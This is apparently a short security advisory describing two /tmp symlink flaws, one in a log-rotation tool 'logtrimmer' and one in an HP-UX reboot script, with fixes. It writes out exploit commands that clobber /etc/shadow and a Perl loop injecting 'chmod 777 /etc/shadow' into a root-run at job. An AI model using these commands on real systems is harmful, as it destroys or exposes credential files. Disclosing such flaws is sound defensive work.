Vulnerability

The log rotation utility “logtrimmer” utilizes space in /tmp improperly and is subject to a symlink attack. By creating a targeted symlink a non root user can clobber root owned files causing DoS.

Exploit

nobody:/tmp> ln -s /etc/shadow patchlink.tmp

After logs are rotated

/etc/shadow will be size 0, since patchlink.tmp is removed by logtrimmer after the log rotation process has finished.


Fix

Create a subdirectory under /tmp or /var/tmp to work from.

For example adding:

mkdir /var/tmp/plink
chmod 700 /var/tmp/plink
 
Second Vulnerability:


The script rebootTask contains the following lines for HP-UX Shutdown and reboot:

 echo "shutdown -r -y 120" > /tmp/plshutdown
    chmod 500 /tmp/plshutdown
    at now < /tmp/plshutdown

A race condition exists where a local user could symlink /tmp/plshutdown to a file in their home directory and inject malicous code. This could be done possibly by continuously writing to the file while waiting for the at command to run.

$ ln -s /tmp/plshutdown /var/tmp/runme

#/bin/perl
while(1){
`echo "chmod 777 /etc/shadow" > /var/tmp/runme`;
}

Also could be fixed by creating a subdirectory to work from under /var/tmp or /tmp.
